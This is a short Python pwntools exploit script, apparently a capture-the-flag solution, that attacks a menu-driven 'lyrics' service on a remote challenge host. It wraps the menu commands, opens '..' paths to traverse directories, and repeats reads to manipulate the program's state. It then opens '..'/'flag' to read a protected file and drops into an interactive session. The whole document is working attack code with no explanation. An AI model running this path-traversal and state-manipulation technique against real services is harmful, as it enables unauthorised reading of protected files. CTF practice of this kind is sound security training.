from pwn import *

remote_addr=['lyrics.hackable.software',4141]
#context.log_level=True

p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def cmd(command):
    sla("> ",command)

def bands():
    cmd("bands")

def songs(band):
    cmd("songs")
    sla("Band: ",band)

def _open(band,song):
    cmd("open")
    sla("Band: ",band)
    sla("Song: ",song)

def _read(idx):
    cmd("read")
    sla("ID: ",str(idx))

def _write(idx,content):
    cmd("write")
    sla("ID: ",str(idx))
    sla("length: ",str(len(content)+1))
    sa(": ",content)

def _close(idx):
    cmd("close")
    sla("ID: ",str(idx))

if __name__ == '__main__':
    for i in xrange(16):
        _open("..",'lyrics')

    for i in xrange(16):
        for j in xrange(24):
            _read(0)
    
    for i in xrange(12):
        _open('The Beatles','Girl')

    _open("..",'flag')
    for i in xrange(31):
        _read(0)
    _read(12)
    _read(0)
    p.interactive()
